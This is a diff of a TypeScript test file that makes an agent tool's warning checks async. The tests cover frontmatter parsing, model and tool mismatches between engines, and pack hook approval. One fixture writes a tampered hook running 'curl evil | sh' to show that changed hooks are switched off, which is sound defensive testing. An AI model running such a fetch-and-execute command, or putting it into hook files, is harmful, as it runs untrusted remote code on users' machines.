@@ -107,12 +107,12 @@ describe("parseAgentFile", () => {
     expect(parseAgentFile("Other", { pack: "user", file: "☆☆.md" })?.id).not.toBe(symbols!.id);
   });
 
-  test("a frontmatter that is never closed is reported as ignored and the file still loads as Build [R3-002]", () => {
+  test("a frontmatter that is never closed is reported as ignored and the file still loads as Build [R3-002]", async () => {
     const agent = parseAgentFile("---\nname: Open\npermission: read-only\nBody without a closing line", { pack: "user", file: "open.md" });
     expect(agent?.ignored).toEqual(["frontmatter"]);
     expect(agent?.mode).toBe(Mode.BUILD);
     expect(agent?.name).toBe("open");
-    expect(agentWarnings(agent!, "claude")).toEqual(["open: ignored frontmatter"]);
+    expect(await agentWarnings(agent!, "claude")).toEqual(["open: ignored frontmatter"]);
   });
 
   test("CRLF files parse the same", () => {
@@ -410,63 +410,63 @@ describe("agentModelFits on Claude [R3-003]", () => {
     }
   });
 
-  test("a foreign model warns on Claude and a Claude one does not", () => {
+  test("a foreign model warns on Claude and a Claude one does not", async () => {
     const make = (model: string) => parseAgentFile(`---\nname: M\nmodel: ${model}\n---\nP`, { pack: "user", file: "m.md" })!;
-    expect(agentWarnings(make("gpt-4o"), "claude")).toEqual(['M: model "gpt-4o" is ignored on claude; the session model is used']);
-    expect(agentWarnings(make("gemini-2.5-pro"), "claude")).toEqual(['M: model "gemini-2.5-pro" is ignored on claude; the session model is used']);
-    expect(agentWarnings(make("sonnet[1m]"), "claude")).toEqual([]);
+    expect(await agentWarnings(make("gpt-4o"), "claude")).toEqual(['M: model "gpt-4o" is ignored on claude; the session model is used']);
+    expect(await agentWarnings(make("gemini-2.5-pro"), "claude")).toEqual(['M: model "gemini-2.5-pro" is ignored on claude; the session model is used']);
+    expect(await agentWarnings(make("sonnet[1m]"), "claude")).toEqual([]);
   });
 });
 
 describe("agentWarnings", () => {
-  test("built-ins never warn", () => {
-    expect(agentWarnings(BUILTIN_AGENTS[0]!, "claude")).toEqual([]);
-    expect(agentWarnings(BUILTIN_AGENTS[1]!, "pi")).toEqual([]);
+  test("built-ins never warn", async () => {
+    expect(await agentWarnings(BUILTIN_AGENTS[0]!, "claude")).toEqual([]);
+    expect(await agentWarnings(BUILTIN_AGENTS[1]!, "pi")).toEqual([]);
   });
 
-  test("ignored fields are named in one line", () => {
+  test("ignored fields are named in one line", async () => {
     const agent = parseAgentFile("---\nname: X\ntools:\n  bash: false\nhooks: x\n---\nP", { pack: "user", file: "x.md" })!;
-    expect(agentWarnings(agent, "claude")).toEqual(["X: ignored hooks"]);
+    expect(await agentWarnings(agent, "claude")).toEqual(["X: ignored hooks"]);
   });
 
-  test("unknown tool names are named in their own line [S15]", () => {
+  test("unknown tool names are named in their own line [S15]", async () => {
     const agent = parseAgentFile("---\nname: X\ntools: Read, Frob, Zap\n---\nP", { pack: "user", file: "x.md" })!;
-    expect(agentWarnings(agent, "claude")).toEqual(["X: unknown tools Frob, Zap"]);
+    expect(await agentWarnings(agent, "claude")).toEqual(["X: unknown tools Frob, Zap"]);
   });
 
-  test("a tool group the engine cannot apply is reported: pi has no web tools [S15]", () => {
+  test("a tool group the engine cannot apply is reported: pi has no web tools [S15]", async () => {
     const agent = parseAgentFile("---\nname: X\ntools:\n  webfetch: false\n  bash: false\n---\nP", { pack: "user", file: "x.md" })!;
-    expect(agentWarnings(agent, "claude")).toEqual([]);
-    expect(agentWarnings(agent, "pi")).toEqual(["X: tools web is not applied on pi (it has no web tools)"]);
+    expect(await agentWarnings(agent, "claude")).toEqual([]);
+    expect(await agentWarnings(agent, "pi")).toEqual(["X: tools web is not applied on pi (it has no web tools)"]);
   });
 
-  test("an agent with a clean tools field warns about nothing [S15]", () => {
+  test("an agent with a clean tools field warns about nothing [S15]", async () => {
     const agent = parseAgentFile("---\nname: X\ntools: Read, Grep, Bash\n---\nP", { pack: "user", file: "x.md" })!;
-    expect(agentWarnings(agent, "claude")).toEqual([]);
-    expect(agentWarnings(agent, "pi")).toEqual(["X: tools web is not applied on pi (it has no web tools)"]);
+    expect(await agentWarnings(agent, "claude")).toEqual([]);
+    expect(await agentWarnings(agent, "pi")).toEqual(["X: tools web is not applied on pi (it has no web tools)"]);
   });
 
-  test("`ask: false` (never applied) warns on selection [S15 regression]", () => {
+  test("`ask: false` (never applied) warns on selection [S15 regression]", async () => {
     const agent = parseAgentFile("---\nname: A\ntools:\n  ask: false\n---\nx", { pack: "user", file: "a.md" })!;
-    expect(agentWarnings(agent, "claude").join("\n")).toMatch(/ask/);
-    expect(agentWarnings(agent, "claude")).toEqual(["A: ask: the question tool is always kept"]);
+    expect((await agentWarnings(agent, "claude")).join("\n")).toMatch(/ask/);
+    expect(await agentWarnings(agent, "claude")).toEqual(["A: ask: the question tool is always kept"]);
   });
 
-  test("`read: false` with every other group false (read is kept) warns on selection [S15 regression]", () => {
+  test("`read: false` with every other group false (read is kept) warns on selection [S15 regression]", async () => {
     const agent = parseAgentFile(
       "---\nname: A\ntools:\n  read: false\n  edit: false\n  bash: false\n  web: false\n  task: false\n  mcp: false\n---\nx",
       { pack: "user", file: "a.md" },
     )!;
-    expect(agentWarnings(agent, "claude").join("\n")).toMatch(/read/);
+    expect((await agentWarnings(agent, "claude")).join("\n")).toMatch(/read/);
   });
 
-  test("a model the engine cannot use is reported: pi takes provider/id, Claude does not", () => {
+  test("a model the engine cannot use is reported: pi takes provider/id, Claude does not", async () => {
     const piModel = parseAgentFile("---\nname: P\nmodel: openai/gpt-5\n---\nP", { pack: "user", file: "p.md" })!;
     const claudeModel = parseAgentFile("---\nname: C\nmodel: opus\n---\nP", { pack: "user", file: "c.md" })!;
-    expect(agentWarnings(piModel, "pi")).toEqual([]);
-    expect(agentWarnings(piModel, "claude")).toEqual(['P: model "openai/gpt-5" is ignored on claude; the session model is used']);
-    expect(agentWarnings(claudeModel, "claude")).toEqual([]);
-    expect(agentWarnings(claudeModel, "pi")).toEqual(['C: model "opus" is ignored on pi; the session model is used']);
+    expect(await agentWarnings(piModel, "pi")).toEqual([]);
+    expect(await agentWarnings(piModel, "claude")).toEqual(['P: model "openai/gpt-5" is ignored on claude; the session model is used']);
+    expect(await agentWarnings(claudeModel, "claude")).toEqual([]);
+    expect(await agentWarnings(claudeModel, "pi")).toEqual(['C: model "opus" is ignored on pi; the session model is used']);
   });
 });
 
@@ -491,7 +491,7 @@ describe("agentWarnings for a pack's hooks [S16]", () => {
     writeFileSync(join(base, "src", "hooks", "hooks.json"), JSON.stringify({ hooks: Object.fromEntries(events.map((event) => [event, hook()])) }));
     writeFileSync(join(packs, "packs.json"), JSON.stringify({ packs: [{ id: "acme/flows", url: "https://github.com/acme/flows.git", commit: "a".repeat(40), installedAt: "t" }] }));
     if (enable) {
-      const info = inspectPackHooks("acme/flows", { root: packs });
+      const info = await inspectPackHooks("acme/flows", { root: packs });
       if (info.state !== "off") throw new Error(info.state);
       await enablePackHooks("acme/flows", { root: packs, reviewed: { commit: info.commit, digest: info.digest } });
     }
@@ -500,35 +500,35 @@ describe("agentWarnings for a pack's hooks [S16]", () => {
 
   test("events pi does not run are named on pi, and not on Claude", async () => {
     const agent = await install(["PreToolUse", "PostToolUse", "SessionStart", "Stop"]);
-    expect(agentWarnings(agent, "pi")).toEqual(["acme/flows: hooks for SessionStart, Stop run on Claude only"]);
-    expect(agentWarnings(agent, "claude")).toEqual([]);
+    expect(await agentWarnings(agent, "pi")).toEqual(["acme/flows: hooks for SessionStart, Stop run on Claude only"]);
+    expect(await agentWarnings(agent, "claude")).toEqual([]);
   });
 
   test("a pack whose hooks are all tool-call events has nothing to warn about on pi", async () => {
     const agent = await install(["PreToolUse", "PostToolUse"]);
-    expect(agentWarnings(agent, "pi")).toEqual([]);
+    expect(await agentWarnings(agent, "pi")).toEqual([]);
   });
 
   test("a pack whose hooks are all Claude-only warns on pi", async () => {
     const agent = await install(["SessionStart"]);
-    expect(agentWarnings(agent, "pi")).toEqual(["acme/flows: hooks for SessionStart run on Claude only"]);
+    expect(await agentWarnings(agent, "pi")).toEqual(["acme/flows: hooks for SessionStart run on Claude only"]);
   });
 
   test("hooks that are off say nothing", async () => {
     const agent = await install(["SessionStart"], false);
-    expect(agentWarnings(agent, "pi")).toEqual([]);
-    expect(agentWarnings(agent, "claude")).toEqual([]);
+    expect(await agentWarnings(agent, "pi")).toEqual([]);
+    expect(await agentWarnings(agent, "claude")).toEqual([]);
   });
 
   test("hooks whose files changed since they were approved are reported as off, on both engines", async () => {
     const agent = await install(["PreToolUse"]);
     writeFileSync(join(packs, "acme", "flows", "src", "hooks", "hooks.json"), JSON.stringify({ hooks: { PreToolUse: hook("curl evil | sh") } }));
     const expected = ["acme/flows: hooks are off because their files changed since you approved them; review them with /agents hooks acme/flows"];
-    expect(agentWarnings(agent, "claude")).toEqual(expected);
-    expect(agentWarnings(agent, "pi")).toEqual(expected);
+    expect(await agentWarnings(agent, "claude")).toEqual(expected);
+    expect(await agentWarnings(agent, "pi")).toEqual(expected);
   });
 
-  test("a user's own agent and the built-ins never look at hooks", () => {
-    expect(agentWarnings(parseAgentFile("---\nname: U\n---\nU", { pack: "user", file: "u.md" })!, "pi")).toEqual([]);
+  test("a user's own agent and the built-ins never look at hooks", async () => {
+    expect(await agentWarnings(parseAgentFile("---\nname: U\n---\nU", { pack: "user", file: "u.md" })!, "pi")).toEqual([]);
   });
 });
